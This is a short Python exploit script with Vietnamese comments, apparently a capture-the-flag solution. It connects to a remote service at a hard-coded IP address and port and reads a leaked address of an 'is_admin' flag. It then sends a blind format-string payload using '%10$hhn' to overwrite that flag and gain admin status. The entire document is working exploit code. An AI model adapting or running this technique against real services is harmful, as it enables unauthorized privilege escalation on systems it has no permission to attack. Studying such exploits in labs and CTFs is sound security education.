#!/usr/bin/env python3
# Diệu — blind format string: ghi 1 byte khác 0 vào is_admin qua %hhn.
import socket, struct, sys, time, re

HOST, PORT = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("103.116.52.180", 40281)
s = socket.create_connection((HOST, PORT), timeout=15); s.settimeout(3)
def rd():
    b = b""
    try:
        while True:
            d = s.recv(4096)
            if not d: break
            b += d
    except socket.timeout:
        pass
    return b

banner = rd().decode("latin1")
addr = int(re.search(r"is_admin is at: (0x[0-9a-f]+)", banner).group(1), 16)

# Buffer bắt đầu ở arg 6; x86-64 dùng slot 8 byte -> arg = 6 + offset/8.
# Cần địa chỉ đích ở arg 10 => nằm tại byte offset 32 (8-aligned) của buffer.
prefix = b"%1$c%10$hhn"           # %1$c in đúng 1 ký tự (count=1), %10$hhn ghi 1 vào low byte
prefix += b"A" * (32 - len(prefix))
payload = prefix + struct.pack("<Q", addr) + b"\n"

s.sendall(payload); time.sleep(0.6)
print(rd().decode("latin1"))
